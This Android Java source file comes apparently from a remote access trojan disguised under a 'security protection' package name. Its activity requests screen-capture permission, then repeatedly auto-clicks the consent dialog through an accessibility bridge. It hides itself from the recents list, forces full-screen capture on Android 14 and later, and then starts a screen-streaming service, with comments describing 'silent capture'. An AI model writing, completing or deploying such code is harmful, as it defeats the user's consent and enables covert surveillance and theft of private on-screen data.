package com.seguranca.protecao;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

public class MediaProjectionRequestActivity extends Activity {

    private static final String TAG = "MPRequest";
    private static final int REQ = 9911;
    // [KRYPTOS-PATCH] Interruptor: false = sin dialogo, se usa captura silenciosa por accesibilidad
    public static final boolean ENABLED = false;
    // Solo hace falta en Android 10 o inferior: desde API 30 existe captura silenciosa
    public static boolean needed() { return Build.VERSION.SDK_INT < 30; }
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean done = false;
    private int tries = 0;
    private static volatile boolean alive = false;
    // [KRYPTOS-PATCH PERF] gate por timestamp: se a activity nao abrir, nao trava mais
    private static volatile long lastLaunchTs = 0L;

    public static void launch(Context ctx) {
        if (!ENABLED && !needed()) return;
        try {
            long now = System.currentTimeMillis();
            if (now - lastLaunchTs < 8000L) return;
            lastLaunchTs = now;
            Intent i = new Intent(ctx, MediaProjectionRequestActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            ctx.startActivity(i);
            Log.d(TAG, "launch pedido de projecao");
        } catch (Throwable t) {
            Log.w(TAG, "launch: " + t);
        }
    }

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        if (!ENABLED && !needed()) { finish(); return; }
        if (alive) { finish(); return; }
        alive = true;
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm == null) { finish(); return; }
            if (ScreenStreamService.isActive()) { finish(); return; }
            // [KRYPTOS-PATCH] Android 14+: forzar pantalla completa, sin selector de app
            if (Build.VERSION.SDK_INT >= 34) {
                try {
                    startActivityForResult(mpm.createScreenCaptureIntent(android.media.projection.MediaProjectionConfig.createConfigForDefaultDisplay()), REQ);
                } catch (Throwable t34) {
                    startActivityForResult(mpm.createScreenCaptureIntent(), REQ);
                }
            } else {
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ);
            }
            startRetryLoop();
            handler.postDelayed(new Runnable() { public void run() { if (!done) { Log.w(TAG, "watchdog: sin respuesta, cerrando"); finish(); } } }, 13000L);
        } catch (Throwable t) {
            Log.w(TAG, "onCreate: " + t);
            finish();
        }
    }

    private void startRetryLoop() {
        if (done || tries >= 30) return;
        tries++;
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override public void run() {
                if (done) return;
                if (ScreenStreamService.isActive()) { finish(); return; }
                UiAssistBridge.clickProjectionStart();
                startRetryLoop();
            }
        }, 400L);
    }

    @Override
    protected void onDestroy() {
        alive = false;
        super.onDestroy();
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        done = true;
        handler.removeCallbacksAndMessages(null);
        super.onActivityResult(req, res, data);
        try {
            if (req == REQ && res == RESULT_OK && data != null) {
                getSharedPreferences("rat_prefs", MODE_PRIVATE).edit().putBoolean("proj_ok", true).apply();
                Intent s = new Intent(this, ScreenStreamService.class);
                s.putExtra("resultCode", res);
                s.putExtra("data", data);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(s);
                else startService(s);
                Log.d(TAG, "consentimento OK");
            } else {
                Log.d(TAG, "consentimento cancelado");
            }
        } catch (Throwable t) {
            Log.w(TAG, "onActivityResult: " + t);
        }
        finish();
    }
}